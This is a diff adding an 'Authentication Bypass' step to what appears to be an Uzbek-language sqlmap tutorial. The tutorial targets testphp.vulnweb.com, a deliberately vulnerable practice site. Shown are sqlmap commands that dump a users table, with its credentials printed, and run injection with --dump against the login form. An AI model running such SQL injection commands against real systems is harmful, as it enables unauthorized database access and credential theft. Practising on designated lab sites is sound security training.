@@ -34,3 +34,8 @@ sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users
 ```  
 | name         | uname | pass |  
 | John M Smith | test  | test |   
+
+5. Authentication Bypass (Kirishni chetlab o'tish)
+```
+sqlmap -u "http://testphp.vulnweb.com/login.php" --data="username=admin&password=1234" --dump
+```
